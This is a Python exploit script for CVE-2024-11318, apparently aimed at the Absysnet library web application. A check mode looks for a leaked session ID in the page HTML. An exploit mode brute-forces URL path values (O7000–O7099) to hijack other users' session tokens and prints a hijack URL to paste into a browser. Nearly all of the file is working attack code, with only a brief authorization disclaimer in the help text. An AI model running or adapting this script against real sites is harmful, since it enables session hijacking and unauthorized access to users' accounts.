#/usr/bin/python3

#Author: xThalach https://xthalach.github.io/
#instagram: @xthalach.twitch
#twitter: @xthalach

import argparse
import requests
import re
from pwn import log
import signal
import sys
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

# Suppress only InsecureRequestWarning
disable_warnings(InsecureRequestWarning)

# Managing CTRL+C to exit the exploit. 
def sigint_handler(signal, frame):
    print("\nQuitting...")
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)


# Banner and author information.
def banner():
    banner = """                                                                                                                                                                      
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ ██╗██████╗  ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║███║╚════██╗███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚██║ █████╔╝╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║ ██║ ╚═══██╗ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║ ██║██████╔╝ ██║╚█████╔╝
    ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚═╝╚═════╝  ╚═╝ ╚════╝ 

    ᴀᴜᴛʜᴏʀ﹕ xᴛʜᴀʟᴀᴄʜ ʜᴛᴛᴘs﹕//xᴛʜᴀʟᴀᴄʜ.ɢɪᴛʜᴜʙ.ɪᴏ/
    ɪɴsᴛᴀɢʀᴀᴍ﹕ ﹫xᴛʜᴀʟᴀᴄʜ.ᴛᴡɪᴛᴄʜ
    ᴛᴡɪᴛᴛᴇʀ﹕ ﹫xᴛʜᴀʟᴀᴄʜ
    """
    print(banner)


# Function to check if the url aplication is vulnerable. 
def check(url):
    p0 = log.progress("CHECKING URL")
    try:
        idValue = re.split(r'\/(ID\w+)\/?', url)[-2]
        url = re.sub(idValue, "", url)
        p0.status("{}".format(url))
        r = requests.get(url, verify=False)

        if (idValue in r.text):
            p1 = log.progress("VULNERABLE")
            p1.success("The token '{}' has been found in the html code.".format(idValue))
        else:
            p2 = log.progress("NOT VULNERABLE")
            p2.failure("The aplication is not vulnerable OR the token '%s' has expired", idValue)
    except IndexError:
        p3 = log.progress("NOT VULNERABLE")
        p0.status(url)
        pattern = r"/([a-zA-Z0-9]+)\?"
        match = re.search(pattern, url)
        if match:
            token = match.group(1)
            p3.failure("The aplication has been pached, token value \"%s\" not match.", token)
    

def exploit(url):    
    p1 = log.info("--- STARTING EXPLOIT ---")
    try:
        # Catch the ID token value from the URL.
        idValue = re.split(r'\/(ID\w+)\/?', url)[-2]
        # Delete the ID token from the URL, to make it iterable. 
        site = re.sub(idValue, "", url)
        # Split the URL by /. 
        url = url.rsplit("/", 1)[0].split("/")
        # Take the local port value.
        localPort = url[len(url)-1]
        # Change the local port value for the token word. 
        url = re.sub(localPort, "token", site)
        # Log progress 
        p2 = log.progress("URL")
        # Loop to iterate throught 1-999
        for i in range(0, 100):
            # Making variable num to have 3 digits. 
            num = f"{i:03}"
            # Formating the iterable URL. 
            iterableUrl = re.sub("token", "O7{}".format(num), url)
            p2.status(iterableUrl)
            r = requests.get(iterableUrl, timeout=5, verify=False)
            if ("NT1?ACC=301" in r.text):
                p3 = log.progress("User Token Hijacking")
                pattern = r'ID[a-zA-Z0-9]{8}'    
                session = re.search(pattern, r.text)
                pos = iterableUrl.find('?')
                successUrl = iterableUrl[:pos] + session.group() + iterableUrl[pos:]
                p3.success("%s (COPY & PASTE INTO BROWSER)", successUrl)
    except IndexError:
        p0 = log.progress("NOT VULNERABLE")
        pattern = r"/([a-zA-Z0-9]+)\?"
        match = re.search(pattern, url)
        if match:
            token = match.group(1)
            p0.failure("The aplication has been pached, token value \"%s\" not match.", token)


if __name__ == "__main__":
    # Show the banner
    banner()
    # Managing the arguments. 
    parse = argparse.ArgumentParser(            
            description="This script allows you to assess whether a website is vulnerable to CVE-2024-11318. \nIf confirmed, it provides the option to exploit the vulnerability, but only under circumstances where you have explicit authorization to do so."
            )
    parse.add_argument('-u', '--url', type=str, help='Target URL', required=True)
    parse.add_argument('--check', action='store_true', help="This option in this script allows you to test whether a website is vulnerable to the CVE-2024-11318.")
    parse.add_argument('--exploit', action='store_true', help="This option in this script enables you to exploit the CVE-2024-11318 vulnerability.")
    
    # Display help menu if no arguments are provided
    if len(sys.argv) == 1:
        parse.print_help(sys.stderr)
        sys.exit(1)

    args = parse.parse_args()
    p0 = log.progress("STARTING ATTACK")
    # Checking if the URL is from the Absysnet
    if "ACC=101" in args.url :
        p0.status("CORRECT URL!")
        if args.check:
            p0.status("CHECKING IF THE TARGET IT'S VULNERABLE!")
            check(args.url)
        elif args.exploit:
            p0.status("EXPLOITING THE TARGET!")
            exploit(args.url)
    else:
        p0.failure("WRONG URL FORMAT!")
